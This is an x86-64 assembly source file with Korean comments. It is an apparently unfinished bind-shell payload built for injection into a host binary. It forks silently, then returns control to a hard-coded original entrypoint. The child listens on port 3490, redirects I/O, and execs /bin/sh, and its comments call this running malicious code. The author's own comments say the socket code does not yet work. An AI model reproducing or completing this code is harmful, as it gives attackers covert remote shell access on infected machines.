BITS 64

%include "inc64.inc"

section .data
; Constant
MAXDATASIZE equ 1024
SOCK_STREAM equ 1
AF_INET equ 2

; 현재 문제점 구조체 값 자체가 이상해 소켓 연결이 안됨
; 파이프는 정상
; 전체 구조체를 다시 수정하거나 원리를 깨달아야함
; Data Structure
struc my_addr, -16 ; rbp - 16부터 첫번째 구조체 시작
    .sin_family:    resb 2;2bytes
    .sin_port:      resb 2;2bytes
    .sin_addr:      resb 4;4bytes
    .sin_zero:      resb 8;8bytes
endstruc

struc their_addr, -32 ; rbp - 32부터 첫번째 구조체 시작
    .sin_family:    resb 2;2bytes
    .sin_port:      resb 2;2bytes
    .sin_addr:      resb 4;4bytes
    .sin_zero:      resb 8;8bytes
endstruc

struc socket, -1072; rbp - 1052 부터 첫번째 구조체 시작 
    .sockfd: resb 4; 4bytes
    .newfd: resb 4; 4bytes
    .sin_size: resb 4; 4bytes
    .numbytes: resb 4; 4bytes
    .buf: resb MAXDATASIZE ; 1024bytes
endstruc

struc pipefd, -1080 ; rbp - 1056 부터 첫번째 구조체 시작
    .read: resb 4; 4bytes
    .write: resb 4; 4bytes
endstruc


; error message
forkErrorMessage: db "fork",10,0
socketErrorMessage: db "socket",10,0
bindErrorMessage: db "bind",10,0
pipeErrorMessage: db "pipe",10,0
closeErrorMessage: db "close",10,0
dup2ErrorMessage: db "dup2",10,0
recvfromErrorMessage: db "recvfrom",10,0
setsockoptErrorMessage: db "setsockopt",10,0
listenErrorMessage: db "listen",10,0
acceptErrorMessage: db "accept",10,0
command: db "/bin/sh",0
reuseAddress: dd 1
argv: db command, 0
envp: db 0 
test_command: db "whoami",10,0


SECTION .text
global main
 
main:
    push rax                 ; save all clobbered registers
    push rcx                 ; (rcx and r11 destroyed by kernel)
    push rdx
    push rsi
    push rdi
    push r11

    jmp _fork1

_child:
    push rbp ;function 프롤로그
    mov rbp, rsp
    sub rsp, 2000 ; 여유 스택 공간 확보


    call _socket
    
    mov dword [rbp + socket.sockfd], eax ; save to socket fd

    call _setsockopt


    mov word [rbp + my_addr.sin_family], AF_INET ; host byte order
    mov word [rbp + my_addr.sin_port], 0xa20d ; port 3490
    mov dword [rbp + my_addr.sin_addr], 0x100007f; 127.0.0.1
    mov qword [rbp + my_addr.sin_zero], 0
    
    
    call _bind

    call _listen

    call _accept

    mov dword [rbp + socket.newfd], eax; save to newsock fd

    call _pipe

    jmp _fork2

_child_execve:
    ;call _pipe
    ; 파이프의 쓰기 단을 닫음
    ; close($rdi) 성공하면 0
    mov edi, dword[rbp + pipefd.write] ; write
    mov rax, SYS_CLOSE
    syscall
    cmp rax, 0
    jne _closeFailed

    ;               $rdi      $rsi
    ; int dup2(int oldfd, int newfd);
    ; 표준 출력을 소켓으로 리디렉션
    ; 실패하면 -1
    mov edi, dword[rbp + socket.newfd]
    mov rsi, STDOUT_FILENO
    mov rax, SYS_DUP2
    syscall
    cmp rax, -1
    je _dup2Failed

    ;               $rdi      $rsi
    ; int dup2(int oldfd, int newfd);
    ; 표준 에러를 소켓으로 리디렉션
    ; 실패하면 -1
    mov edi, dword[rbp + socket.newfd]
    mov rsi, STDERR_FILENO
    mov rax, SYS_DUP2
    syscall
    cmp rax, -1
    je _dup2Failed

    ;               $rdi      $rsi
    ; int dup2(int oldfd, int newfd);
    ; 표준 입력을 파이프로 리디렉션
    ; 실패하면 -1
    mov edi, dword[rbp + pipefd.read] ;read
    mov rsi, STDIN_FILENO
    mov rax, SYS_DUP2
    syscall
    cmp rax, -1
    je _dup2Failed

    ; $rdi, $rsi, $rdx
    lea rdi, [rel $+command-$]
    xor rsi, rsi
    xor rdx, rdx
    ;lea rsi, [rel $+argv-$]
    ;lea rdx, [rel $+envp-$]
    mov rax, SYS_EXECVE
    syscall

    ; 여기는 execve 실패한 경우
    jmp _end


_parent_socket: ; TODO : recvfrom하고, 수신한 명령어를 child process에 쓰고 accept 반복!
    ;call _pipe
    ; 파이프의 읽기 단을 닫음
    ; close($rdi) 성공하면 0
    mov edi, dword[rbp + pipefd.read] ; pipefd.read
    mov rax, SYS_CLOSE
    syscall
    cmp rax, 0
    jne _closeFailed

    call _recvfrom

    mov dword[rbp + socket.numbytes], eax

    ;mov byte [rbp + socket.buf + rax], 0


_loop:

    mov edi, dword[rbp + pipefd.write] ;write
    lea rsi, [rbp + socket.buf]
    mov edx, [rbp + socket.numbytes]
    add edx, 1
    mov rax, SYS_WRITE
    syscall


    





    ;mov rax, 1
    ;mov rdi, 1
    ;lea rsi, [rel $+forkErrorMessage-$]
    ;mov dword [rbp - sockaddr_in.sin_addr], 5
    ;mov rdx, [rbp  - sockaddr_in.sin_addr]
    ;syscall

_end:
    ;function 에필로그
    mov rsp, rbp
    pop rbp
    exit

_parent:
    pop r11
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax

    push 0x4049a0            ; jump to entrypoint
    ret


_socket:
    ; socket($rdi, $rsi, $rdx, $rcx)
    mov rdi, AF_INET
    mov rsi, SOCK_STREAM
    mov rdx, 0
    mov rax, SYS_SOCKET
    syscall
    cmp rax, -1
    je _sockFailed
    ret

_setsockopt:
    ;                   $rdi       $rsi         $rdx
    ;int setsockopt(int sockfd, int level, int optname,
    ;                               $rcx            $r8
    ;                  const void *optval, socklen_t optlen);
    mov edi, [rbp + socket.sockfd]
    mov rsi, 1; SOL_SOCKET
    mov rdx, 2 ;SO_REUSEADDR
    lea rcx, [rel $+reuseAddress-$]
    mov r8, 4 ;size of dword
    mov rax, SYS_SETSOCKOPT
    syscall
    cmp rax, 0
    jne _setsockoptFailed
    ret


_bind:
    ;               $rdi                        $rsi
    ; int bind(int sockfd, const struct sockaddr *addr,
    ;                       $rdx
    ;            socklen_t addrlen);
    mov edi, dword [rbp + socket.sockfd]
    lea rsi, [rbp + my_addr]
    mov rdx, 0x10
    mov rax, SYS_BIND
    syscall
    cmp rax, 0
    jne _bindFailed
    ret

_listen:
    ;               $rdi           $rsi
    ;int listen(int sockfd, int backlog);    
    mov edi, dword[rbp + socket.sockfd]
    mov rsi, 10; max connection is 10
    mov rax, SYS_LISTEN
    syscall
    cmp rax, 0
    jne _listenFailed
    ret

_accept:
    ;               $rdi                $rsi                $rdx
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    mov edi, dword[rbp + socket.sockfd]
    lea rsi, [rbp + their_addr]
    mov dword [rbp + socket.sin_size], 0x10; fill size
    lea rdx, [rbp + socket.sin_size]
    mov rax, SYS_ACCEPT
    syscall
    cmp rax, -1
    jle _acceptFailed
    ret

_recvfrom:
    ;                       $rdi       $rsi        $rdx     $rcx
    ; ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
    ;                                       $r8                $r9
    ;                    struct sockaddr *src_addr, socklen_t *addrlen)
    mov edi, dword[rbp + socket.newfd]
    lea rsi, dword[rbp + socket.buf]
    mov rdx, MAXDATASIZE
    mov rcx, 0
    mov r8, 0
    mov r9, 0
    mov rax, SYS_RECVFROM
    syscall
    cmp rax, -1
    jle _recvfromFailed
    ret



_pipe:
    ;               $rdi
    ; int pipe(int pipefd[2]);
    lea rdi, qword [rbp + pipefd]
    mov rax, SYS_PIPE
    syscall
    cmp rax, 0
    jne _pipeFailed
    ret

_fork1:
    ; fork해서 child process에서 악성코드 실행!
    mov rax, SYS_FORK
    syscall
    cmp rax, -1
    je _forkFailed
    cmp rax, 0
    jne _parent
    jmp _child

_fork2:
    ; fork해서 child process에서 악성코드 실행!
    mov rax, SYS_FORK
    syscall
    cmp rax, -1
    je _forkFailed
    cmp rax, 0
    jne _parent_socket
    jmp _child_execve



_forkFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdoutpipeErrorMessage
    lea rsi, [rel $+forkErrorMessage-$]
    mov rdx, 5
    syscall
    mov rsp, rbp
    pop rbp
    exit

_sockFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+socketErrorMessage-$]
    mov rdx, 7 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_bindFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+bindErrorMessage-$]
    mov rdx, 5 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_listenFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+listenErrorMessage-$]
    mov rdx, 7 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_pipeFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+pipeErrorMessage-$]
    mov rdx, 5 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_closeFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+closeErrorMessage-$]
    mov rdx, 6 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_dup2Failed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+dup2ErrorMessage-$]
    mov rdx, 5 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_acceptFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+acceptErrorMessage-$]
    mov rdx, 7 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_recvfromFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+recvfromErrorMessage-$]
    mov rdx, 9 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_setsockoptFailed:
        mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+setsockoptErrorMessage-$]
    mov rdx, 11 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit